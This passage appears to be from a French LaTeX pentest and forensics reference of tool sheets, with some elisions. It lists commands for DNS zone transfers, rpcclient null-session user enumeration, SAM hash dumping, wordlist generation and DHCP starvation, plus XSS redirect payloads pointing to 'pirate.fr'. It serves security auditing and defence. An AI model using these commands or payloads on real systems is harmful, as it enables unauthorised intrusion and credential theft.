\textbf{Transfert de zone avec host et dig : }\\
{\sl \color{blue}host -l pres.fr 192.168.1.1}\\
{\sl \color{blue}dig @192.168.1.1 axfr pres.fr}\\

\textbf{Réponses aux requêtes récursives : }\\
{\sl \color{blue}dig +bufsize=2048 @192.168.1.1 ANY pres.fr}\\
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{OpenVAS}{openvas.png}
{
\small
\url{http://www.openvas.org}\\
\url{http://doc.ubuntu-fr.org/openvas}
}
{
\\Open Source vulnerability scanner and manager (OpenVAS) est un framework bas\'e sur la derni\`ere version Open Source de Nessus. 
Il est compos\'e d'une partie serveur effectuant les tests et d'une partie cliente permettant de configurer le serveur et d'en extraire les donn\'ees.
}
{
\textbf{Installation :}\\
{\sl \color{blue}apt-get install openvas-server openvas-client}\vskip+0.1cm

\textit{Cr\'eation d'un utilisateur :}\\
{\sl \color{blue}openvas-adduser}\vskip+0.1cm

\textit{Mise \`a jour de la base de pluggins :}\\
{\sl \color{blue}openvas-nvt-sync}\\

\textbf{Utilisation :}\vskip+0.1cm
\textit{Lancer le serveur :}\\
{\sl \color{blue}sudo service openvas-server start}\vskip+0.1cm

\textit{Lancer le client :}\\
{\sl \color{blue}openvas-client }\\

\textbf{Remarques :}\\
L'impact du scanner sur une cible est le multiple du nombre de thread (ex\'ecution de test symultan\'ee) et de la criticité des pluggins.\\
Il est donc fortement recommand\'e de limiter le nombre de thread \`a 10 et de d\'esactiver tous les tests de type DOS. 
De plus, afin de limiter la dur\'ee des tests, il est important de s\'electionner exclusivement les pluggins en rapport avec les tests et de suivre l\'etat des tests (permet d'identifier des probl\`emes en cas de faiblesse des cibles).
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{PDF - Format}{PDF.png}{\url{http://www.adobe.com/devnet/pdf/pdf_reference.html}, \url{http://isafepdf.codeplex.com/}}
{
...
\textit{Analyse de la structure de fichier PDF, la commande (-i) interactive permet une exploitation direct plus fine.}\\
...
\textbf{pdfextract}\addcontentsline{toc}{subsubsection}{pdfextract}\\
\textit{Du frameworks Origami codé en ruby, extraction d'objets d'un PDF (image, texte, scripts, polices) :}\\
...
\textbf{pdfsam}\\
\textit{Permet la conversion et la concat\'enation de document pdf de mani\`ere graphique.}\vskip+0.2cm

\textbf{PDFmod}\\
\textit{Permet la rotation de page, suppression ou ajout.}\vskip+0.2cm
...
\addcontentsline{toc}{subsubsection}{Samdump2}
\textit{Exclusivement pour les syst\`emes Windows XP/2003 et antérieurs.}\\
\textbf{Utilisation de samdump2 (\`a partir de la v3 apr\`es XP) pour cr\'eer un fichier pour john ou Ophcrack pour trouver les mots de passe.}\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\HACKfiche{}{RPCclient}{rpcclient.png}
{\url{http:\\www.samba.org}\\\url{http:\\www.samba-tng.org}}
{
\\Client RPC Linux pour service RPC Microsoft et Samba.
}
{
Connexion en session nulle à un service MS-RPC/Samba :\\
{\sl \color{blue}rpcclient -I 92.168.0.1 -U '\%' 192.168.0.1}\vskip+0.2cm

Connexion avec un login et mot de passe (\%password est optionnel, dans ce cas il y a un invité pour saisir le mot de passe) :\\
{\sl \color{blue}rpcclient -I 92.168.0.1 -U 'login\%password' 192.168.0.1}\vskip+0.2cm

Informations du domaine et base SID :\\
\textbf{rpcclient \$> }{\sl \color{blue}lsaquery}\vskip+0.2cm

Version du système d'exploitation :\\
\textbf{rpcclient \$>} {\sl \color{blue}srvinfo}\vskip+0.2cm

Rôle du domaine :\\
\textbf{rpcclient \$>} {\sl \color{blue}dsroledominfo}\vskip+0.2cm

Informations globales du domaine :\\
\textbf{rpcclient \$>} {\sl \color{blue}querydominfo}\vskip+0.2cm

Description des comptes locaux :\\
\textbf{rpcclient \$>} {\sl \color{blue}querydispinfo}\vskip+0.2cm

Politique des comptes du domaine :\\
\textbf{rpcclient \$>} {\sl \color{blue}querydominfo 12}\vskip+0.2cm

Revers SID d'un compte (ici l'administrateur local) :\\
\textbf{rpcclient \$>} {\sl \color{blue}lookupsids S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX-500}\vskip+0.2cm

Liste des SID du domaine :\\
\textbf{rpcclient \$>} {\sl \color{blue}lsaenumsid}\vskip+0.2cm

Liste des utilisateurs du domaine :\\
\textbf{rpcclient \$>} {\sl \color{blue}enumdomusers}\vskip+0.2cm

Liste des Alias ou groupe d'un utilisateur :\\
\textbf{rpcclient \$>} {\sl \color{blue}queryuseraliases builtin 500}\\
\textbf{rpcclient \$>} {\sl \color{blue}queryusergroups 500}\vskip+0.2cm

Liste tous les groupes (builtin ou domain) :\\
\textbf{rpcclient \$>} {\sl \color{blue}enumalsgroups domain}\\
\textbf{rpcclient \$>} {\sl \color{blue}enumdomgroups}\vskip+0.2cm

Information sur un groupe :\\
\textbf{rpcclient \$>} {\sl \color{blue}querygroup 0x220}\v\
\textbf{rpcclient \$>} {\sl \color{blue}queryaliasmem builtin 0x220}\vskip+0.2cm

Quitter le shell interactif :\\
\textbf{rpcclient \$>} {\sl \color{blue}quit}\\

Pour le client rpcclient TNG, certaines commandes n'existent pas ou ont d'autres équivalents. Il faut remplacer :
\begin{itemize}
	\item Informations du domaine : {\sl \color{red}lsaquery} => {\sl \color{blue}enumdomains}
	\item Description des comptes locaux : {\sl \color{red}querydispinfo} => {\sl \color{blue}dispinfo} 
	\item Informations sur le domaine : {\sl \color{red}querydominfo} => {\sl \color{blue}dominfo} 
	\item Liste des utilisateurs du domaine : {\sl \color{red}enumdomusers} => {\sl \color{blue}enumusers} 
\end{itemize}
...
\begin{enumerate}
	...
	{\sl \color{blue}httprint -h http://www.google.fr -s signature.txt}
		...
		\item Par historique Internet : \url{http://toolbar.netcraft.com/site_report?url=http://www.google.fr}
	\end{itemize}
	...
	\begin{itemize}
		\item Recherche de vuln\'erabilit\'e automatique utilisant nmap, metasploit (et Armitage).
			Pour WordPress, Joomla : \url{http://wpscan.org}, \url{http://blog.pepelux.org/2012/07/15/joomlascan-v1-4/}
		\item Recherche dans la base des vuln\'erabilit\'es de \textbf{exploit-db} :\\
	\url{http://www.exploit-db.com/archive.tar.bz2}
		\item en utilisant Metasploit : \url{http://www.metasploit.com/redmine/projects/framework/wiki/WMAP}
	\end{itemize}
	...
	\begin{itemize}
		...
		Zap : \url{http://code.google.com/p/zaproxy/}\\
	...
	\begin{itemize}
		...
		\item Utilisation d'un proxy HTTP/HTTPS : Zap ou Burp
...
\begin{itemize}
	...
	\item\textbf{Wapiti} : (exemple : {\sl \color{blue}wapiti http://www.google.fr/ -u -v 2}) \url{http://wapiti.sourceforge.net/}
	\item \textbf{\nameref{W3af}}
	\item \textbf{\nameref{WebScarab}}
...
\begin{description}
   ...
   \item[$\Square$] Ne pas utiliser \$\_REQUEST (permet l'utilisation du m\^eme param\`etre en \$\_GET et \$\_POST).\vskip-0.1cm
...
{
\url{http://ha.ckers.org/xss.html}, \url{http://heideri.ch/jso/}, \url{http://www.wocares.com/noquote.php}\\
\url{http://www.xssed.com}, \url{http://www.segmentationfault.fr/projets/release-de-xeek-v0-1b/}
}
{
\small
...
{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript">document.location ="http://pirate.fr"</SCRIPT>}}
...
{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript">window.location.replace("http://pirate.fr")</SCRIPT>}}
	\item en VBScript :\\ 
\textbf{\footnotesize \sl \color{blue}http://test.com?user=<\%\@ LANGUAGE="VBSCRIPT" response.redirect "http://pirate.fr" \%>}
\end{itemize}
...
\textbf{Se prot\'eger :}
\begin{description}
   \item[$\Square$] ajouter un jeton limité à la transaction courante et le vérifier afin de valider la transaction;
...
\textit{Lecture d'informations (ici sur la machine \textit{192.168.1.1}, avec le nom de communaut\'e \textit{public}).}\\
   ...
   {\sl \color{blue}snmpwalk -c public 192.168.0.1}
   Avec la version v1 {\sl \color{blue}snmpwalk -v1 -c public 192.168.0.1}\vskip +0.1cm
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{SSL}{openssl.png}
{\url{http://www.openssl.org}
}
{
\\Secure Sockets Layer (SSL), est un protocole permettant le chiffrement des échanges réseau (couche transport).\\
Attention les derni\`eres version d'OpenSSL ne sont pluc compatibles SSLv2, les outils de test l'exploitant ne peuvent donc plus v\'erifier sa pr\'esence. Voir : \url{http://security.sunera.com/2011_02_01_archive.html}
}
{
\begin{LARGE}Points \`a v\'erifier : \end{LARGE}
\begin{description}
    \item[$\Square$] Le protocole SSLv2 vuln\'erable \`a des attaques de type MitM doit \^etre d\'esactiv\'ee.
    \item[$\Square$] Les clés de chiffrement doivent être au minimum de 128bits.
    \item[$\Square$] La ren\'egociation SSL doit \^etre d\'esactiv\'ee.
    \item[$\Square$] Le certificat doit \^etre sign\'e pour le site par une autorit\'e reconnue.\\
\end{description}

\url{http://sourceforge.net/projects/sslscan/}\addcontentsline{toc}{subsubsection}{SSLscan}\\
\textbf{SSLScan :} \textit{(Permet de v\'erifier les protocoles, suites cryptographiques et tailles de clé autoris\'ees.)\\
 N'identifie pas le SSLv2 si OpenSSL n'est pas compil\'e avec (par d\'efaut sur les derni\`eres versions).}\\ 
...
\textbf{THCSSLCheck :}\\
{\sl \color{blue}THCSSLCheck.exe 192.168.1.1 443 | grep -v 'unsupported'}\vskip+0.2cm

\textbf{Ren\'egociation SSL :}\\
Pour v\'erifier la ren\'egociation SSL, il suffit d'appuyer sur la touche {\sl \color{blue}R} :\\
{\sl \color{blue}openssl s\_client -connect <ip>:<port>}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{SubVersion}{subversion.png}
{
\url{http://subversion.apache.org/}, \url{http://cvs.nongnu.org/}, \url{http://git-scm.com/}
}
{
	\\Logiciel de gestion des versions pour des fichiers, utilis\'e notemment par dans le cadre de d\'eveloppement.\\
	Clients Windows : \url{http://tortoisesvn.net/}, \url{http://www.tortoisecvs.org/}, \url{http://code.google.com/p/tortoisegit/}
}
{
\textbf{SVN}\addcontentsline{toc}{subsubsection}{SVN}\\
\url{http://svnbook.red-bean.com/index.fr.html}
\begin{itemize}
	\item Cr\'eer une copie locale : {\sl \color{blue}svn checkout <URL> <project> {-}{-}username <utilisateur>}
	\item Mettre \`a jour la copie locale : {\sl \color{blue}svn update}
	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} svn add/delete <fichier>}
	\item Appliquer les modifications sur le d\'ep\^ot original :\\ {\sl \color{blue}svn commit <file> -m "description de la MAJ" {-}{-}username <utilisateur>}
\end{itemize}

\vskip+0.5cm
\textbf{CVS}\addcontentsline{toc}{subsubsection}{CVS}\\
\url{http://ximbiot.com/cvs/manual/}
\begin{itemize}
	\item Cr\'eer une copie locale : {\sl \color{blue}cvs checkout <URL> <projet>}
	\item Mettre \`a jour la copie locale par ssh :\\ 
	{\sl \color{blue}
	export CVSROOT=<ip>:<chemin>\\
	export CVS\_RSH=ssh\\
	cvs co *
	}
	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} cvs add/delete <fichier>}
	\item Appliquer les modifications sur le d\'ep\^ot original : {\sl \color{blue}cvs commit <fichier>}
\end{itemize}

\vskip+0.5cm
\textbf{GIT}\addcontentsline{toc}{subsubsection}{GIT}\\
\url{http://git-scm.com/book/fr}
\begin{itemize}
	\item Configurer le nom d'utilisateur et le mail pour les commits : \\
	{\sl \color{blue}
	git config {-}{-}global user.name <utilisateur>\\
	git config {-}{-}global user.email <mail>
	}	
	\item Cr\'eer une copie locale : {\sl \color{blue}git clone <URL>}
	\item Mettre \`a jour la copie locale : {\sl \color{blue}git pull}
	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} git add/delete <fichier>}
	\item Appliquer les modifications sur le d\'ep\^ot original : {\sl \color{blue}git commit -m "description de la MAJ"}
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Timeline}{timeline.png}
{
\url{http://computer-forensics.sans.org/blog/2011/12/07/}\\
\url{http://code.google.com/p/log2timeline/}\\
\url{http://code.google.com/p/plaso/}\\
\url{http://sleuthkit.org}
}
{
	\\La génération de la chronologie des \'ev\`enements d'un syst\`eme s'effectue en deux temps : collection des donn\'ees puis construction de la timeline.
}
{
{\Large \textbf{Timeline}}
\begin{itemize}
	\item Timeline du système de fichiers :\\ {\sl \color{blue}timescanner -z <TIMEZONE> -d /mnt/point\_de\_montage -w f\_resultats}\addcontentsline{toc}{subsubsection}{timescanner}
	\item Timeline du système de fichiers des fichiers supprimés :\\ {\sl \color{blue}fls -m c: -r image.raw >> f\_resultats}\addcontentsline{toc}{subsubsection}{fls}
	\item Timeline de la base de registre Windows :\\ {\sl \color{blue}perl regtime.pl -r <ruche> -m <format de ruche> >> f\_resultats}\addcontentsline{toc}{subsubsection}{regtime.pl}
	\item Création de la timeline :\\ {\sl \color{blue}mactime -d -b f\_resultats > timeline.csv}\addcontentsline{toc}{subsubsection}{mactime}
\end{itemize}
Time zone : \url{http://www.cs.berkeley.edu/CT/ag4.0/appendid.htm}\\
Regtime : \url{http://code.google.com/p/winforensicaanalysis/downloads/list}\\
Modèle Excel d'analyse avec coloration : \url{http://computer-forensics.sans.org/blog/2012/01/25/digital-forensic-sifting-colorized-super-timeline-template-for-log2timeline-output-files}\\
Analyse du résultat avec Excel : \url{http://journeyintoir.blogspot.fr/2010/11/reviewing-timelines-with-excel.html}\\
Et calc : \url{http://journeyintoir.blogspot.fr/2010/11/reviewing-timelines-with-calc.html}\\

{\Large \textbf{Super Timeline}}\\
\textbf{log2timeline} \url{http://log2timeline.net/}\addcontentsline{toc}{subsubsection}{log2timeline}\\
Framework Perl avec plugins, permet de construire une timeline avec le système de fichier et d'autres \'el\'ements (pcapc, RAM, log, historique web, evt log...)
\begin{itemize}
	\item Génération d'une super timeline sur un disque entier :\\ {\sl \color{blue}log2timeline-sift -z MET-1METDST -i image.raw -w timeline.csv} 
	\item Pour une partition  : {\sl \color{blue}log2timeline-sift -z MET-1METDST -p 0 -i partition.raw -w timeline.csv} 
	\item Pour une partition  montée avec un système d'exploitation cible Windows 7 : {\sl \color{blue}log2timeline -z MET-1METDST -p -r -f win7 /media/windows7 -w timeline.csv}	
	\item 2 front-end sont fournis en plus de la ligne de commande :
	\begin{itemize}
		\item timescanner : permet de charger plusieurs modules (tous par d\'efaut) et de parcourir les donn\'ees de façon r\'ecursives en essayant les plugins.
		\item glog2timeline : interface graphique non maintenue
	\end{itemize}
	\item Version SANS, log2timeline-sift : \url{http://computer-forensics.sans.org/blog/2011/12/07/digital-forensic-sifting-super-timeline-analysis-and-creation}\addcontentsline{toc}{subsubsection}{log2timeline-sift}
\end{itemize}

\vskip+0.2cm
\textbf{l2t-tools :} \url{http://code.google.com/p/l2t-tools/}\addcontentsline{toc}{subsubsection}{l2t-tools}\\
Filtre des résultats, supprime les entrée dupliquée, avec liste blanche des mots clés à considérés, liste noire des mots clés à exclure sur une intervalle de date :\\
{\sl \color{blue}l2t\_process -b timeline.csv -k liste\_blanche.txt -w liste\_noire.txt 01-25-2013..01-26-2013 > timeline\_filtree.csv}\vskip+0.2cm
Filtre des résultats, supprime les entrée dupliquée, avec liste blanche des mots clés à considérés, liste noire des mots clés à exclure pour un date :\\
{\sl \color{blue}l2t\_process -b timeline.csv -k liste\_blanche.txt -w liste\_noire.txt 01-25-2013 > timeline\_filtree.csv}

\vskip+0.2cm
\textbf{4n6time}\addcontentsline{toc}{subsubsection}{4n6time}\\
\url{https://code.google.com/p/plaso/downloads/list}
\begin{itemize}
	\item Outil graphique du projet Plaso encore en phase de développement.
	\item Accepte les fichiers log2timeline, les bdd, les images disques en entr\'ee. 
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{USB}{USB.png}
{
\url{http://sourceforge.net/projects/noautorun/}, \url{http://www.flashboot.ru/iflash.html}
}
{
...
Informations sur les p\'eriph\'eriques USB : \url{http://www.nirsoft.net/utils/usb_devices_view.html}.\\
Supprimer l'U3 : \url{http://www.u3.com/support/default.aspx}\\
Cr\'eer une cl\'e USB bootable \`a partir d'une image ISO : 
\url{http://unetbootin.sourceforge.net/}\addcontentsline{toc}{subsubsection}{Unetbootin},\\
\url{http://www.linuxliveusb.com/}\addcontentsline{toc}{subsubsection}{LinuxLive USB Creator}, 
\url{http://www.pendrivelinux.com/yumi-multiboot-usb-creator/}\addcontentsline{toc}{subsubsection}{YUMI},\\
\url{http://www.microsoftstore.com/store/msstore/html/pbPage.Help_Win7_usbdvd_dwnTool}\\\addcontentsline{toc}{subsubsection}{Windows7 USB-DVD tool}
Modification de firmware de Cl\'e : \url{http://www.easytutoriel.com/reparer-cle-usb-memoire-flash/}
...
\begin{enumerate}
	...
	\item Il est possible de modifier les droits dans {\sl \color{blue}/etc/fstab} pour que seul root ai le droit de monter un support USB, en supprimant la ligne de format : (Toujours faire une sauvegarde au pr\'ealable du fichier.)\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{VMware CLI ESX}{vmware.png}
{
\url{http://pubs.vmware.com/vsphere-51/index.jsp?topic=/com.vmware.vcli.getstart.doc/cli_about.html}\\
\url{http://www.virtual-node.net/}
}
{
\\Les commandes suivantes sont utilisé afin de configurer directement en ligne de commande un serveur VMware.
}
{
\textbf{Lecture de la configuration}\\
Informations sur la configuration du serveur : {\sl \color{blue}esxcfg-info}\vskip+0.1cm
Version de VMware : {\sl \color{blue}vmware -l}\vskip+0.1cm
Afficher les partitions : {\sl \color{blue}vdf -h}\vskip+0.1cm
Liste des modules charg\'es au d\'emarrage : {\sl \color{blue}esxcfg-module -l}\vskip+0.1cm
\'Etat global du syst\`eme : {\sl \color{blue}esxtop}\vskip+0.1cm 
Liste des services et leurs \'etats : {\sl \color{blue}service {-}{-}status-all}, {\sl \color{blue}chkconfig {-}{-}list}\vskip+0.1cm 
Liste des correctifs install\'es : {\sl \color{blue}esxupdate query}\vskip+0.1cm 
Liste des drivers et versions install\'es : {\sl \color{blue}esxupdate query {-}{-}vib-view}\\

\textbf{Administration}
Modifier la s\'equence de d\'emarrage : {\sl \color{blue}esxcfg-boot}\vskip+0.1cm
Configuration d'ESX : {\sl \color{blue}esxcfg-advcfg}\vskip+0.1cm
Configuration de l'authentification : {\sl \color{blue}esxcfg-auth}\vskip+0.1cm
Gestion des modules ESX : {\sl \color{blue}esxcfg-module}\vskip+0.1cm
Gestion des extensions ESX : {\sl \color{blue}esxcfg-addons}\vskip+0.1cm
Modifier l'heure : {\sl \color{blue}date MMDDhhmmYYYY}\vskip+0.1cm
Synchroniser l'heure du BIOS avec ESX : {\sl \color{blue}hwclock -systohc}\vskip+0.1cm
Mise \`a jour d'ESX : {\sl \color{blue}esxcfg-upgrade}\\

\textbf{Administration - compl\'ements}\\
Mode de maintenance :
\begin{itemize}
	\item Activer : {\sl \color{blue}vimsh -n -e /hostsvc/maintenance\_mode\_enter}
	\item D\'esactiver : {\sl \color{blue}vimsh -n -e /hostsvc/maintenance\_mode\_exit}	
\end{itemize}

G\'eneration d'un journal pour le support VMware : {\sl \color{blue}vm-support}\vskip+0.1cm
Transcription des codes d'erreur en description : {\sl \color{blue}vmkerrcode <code>}\vskip+0.1cm

Services standards de VMware :
\begin{itemize}
	\item {\sl \color{blue}mgmt-vmware} (Serveur hôte)
	\item {\sl \color{blue}vmware-hostd} (Serveur hôte)
	\item {\sl \color{blue}vmware-vmkauthd} (Authentification) 
	\item {\sl \color{blue}vmware-vpxa} (Agent vCenter) 
	\item {\sl \color{blue}vmware-webAccess} (Interface Web)
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
{
\\Outils de s\'ecurit\'e d'OWASP d\'evelopp\'es en Java, permettant d'effectuer des tests de s\'ecurit\'e sur les applications Web HTTP/HTTPS (proxy, spider, automatisation et recherche de failles).
}
{
...
\item \textbf{RegRipper} : \url{http://regripper.wordpress.com}
\end{itemize}
\vskip+0.2cm
...
\textbf{Ressources :}
\begin{itemize}
	\item Récapitulatif des id de journaux : \url{http://www.ultimatewindowssecurity.com/securitylog/quickref/Default.aspx}
\end{itemize}
...
\begin{itemize}
	...
	\item EvtLogParser : \url{http://martin77s.wordpress.com/2010/01/16/evtlogparser/}
	\item EvtxParser : \url{http://computer.forensikblog.de/files/evtx/Parse-Evtx-current.zip}
	\item Revealer Toolkit (evtparse.pl et evtrpt.pl) permet de faire des statistiques :\\ \url{http://code.google.com/p/revealertoolkit/}
	\item RtCA : \url{http://omnia-projetcs.googlecode.com}
\end{itemize}
...
}
{
   ...
   {\small \url{http://www.microsoft.com/downloads/details.aspx?familyid=47809025-D896-482E-A0D6-524E7E844D81}}\\
	...
	\textbf{Pour autoriser l'a connexion à distance en WMI à une machine Windows avec un firewall d'activé :}\\
	{\sl \color{blue}Netsh firewall set service remoteadmin enable}\\
	Ref : \url{http://technet.microsoft.com/en-us/library/cc738900(v=ws.10).aspx}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Wordlist}{wordlist.png}
{
\url{http://download.openwall.net/pub/wordlists/}\\
\url{http://www.skullsecurity.org/wiki/index.php/Passwords}\
}
{
	\\Listes de mots utilisées pour attaquer des mots de passe.
	De très nombreuses wordlist sont disponibles sur le web et les réseaux P2P.\\
	Des outils permettent d'en générer selon plusieurs méthodes.
}
{
\textbf{CUPP}\addcontentsline{toc}{subsubsection}{CUPP}\\
\url{http://www.social-engineer.org/framework/Computer_Based_Social_Engineering_Tools}
\begin{itemize}
	\item Génère une liste de mots de passe en fonction de l'environnement défini. Possibilité de définir des règles spécifiques ou des mots-clefs supplémentaires.
	\item Entrée : nom, prénom, date naissance, enfant, chien etc + mots-clefs définissables 
	\item Sortie : liste de tout les éléments mixés, sauf les mots clefs qui sont juste pré/sufixés
	\item Exemple : {\sl \color{blue}python cupp.py -i}
\end{itemize}

\vskip+0.5cm
\textbf{CEWL}\addcontentsline{toc}{subsubsection}{CEWL}\\
\url{http://www.digininja.org/projects/cewl.php}
\begin{itemize}
	\item Génère une liste de mots de passe en fonction du contenu d'un site.
	\item Entrée : url
	\item Sortie : liste de mots
	\item Exemple : {\sl \color{blue}./cewl.rb -w list.txt www.example.org}
\end{itemize}

\vskip+0.5cm
\textbf{RSMangler}\addcontentsline{toc}{subsubsection}{RSMangler}\\
\url{http://www.randomstorm.com/rsmangler-security-tool.php}
\begin{itemize}
	\item Génère une liste de mots à partir d'une autre en appliquant permutation, ajout de pre/suffixe, leet, minuscule/majuscule, acronyme etc.\\
	Les options sont toutes actives par défaut, les ajouter à la commande les désactive.
	\item Entrée : liste de mots 
	\item Sortie : liste de mots 
	\item Exemple : {\sl \color{blue}./rsmangler.rb -f list.txt -reverse > output.txt}
\end{itemize}

\vskip+0.5cm
\textbf{Crunch}\addcontentsline{toc}{subsubsection}{Crunch}\\
\url{http://sourceforge.net/projects/crunch-wordlist/}
\begin{itemize}
	\item Génère une liste de mots à partir de différents paramètre (longueur, type de caractères à inclure etc).
	\item Entrée : paramètres 
	\item Sortie : liste de mots
	\item Exemple : {\sl \color{blue}crunch 1 8 -o list.txt (liste de a à zzzzzzzz)}
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
Pour utiliser plusieurs interfaces il suffit d'en s\'electionner plusieurs (i, ou menu Actions->Edits interfaces).}\\
 ...
 \textit{L'objectif est d'envoyer un grand nombre de demandes d'adresse avec des adresses MAC al\'eatoires pour saturer le nombre d'adresses \`a alouer.}\vskip+0.1cm
 \textbf{Ex\'ecuter Yersinia en mode console : } {\sl \color{blue} yersinia -I}\\
 \textbf{S\'electionner l'interface r\'eseau : } {\sl \color{blue}i}\\
...
\begin{itemize}
	...
	\item \textbf{Bases d'exploits \& CVE :}
	\begin{itemize}
		\item \url{http://www.exploit-db.com}
		\item \url{http://twitter.com/inj3ct0r}
		\item \url{http://www.exploitsearch.net/index.php}
		...
		\vskip+0.1cm
		\item \url{http://nvd.nist.gov}
		\item \url{http://www.cve.mitre.org/cve/cve.html}
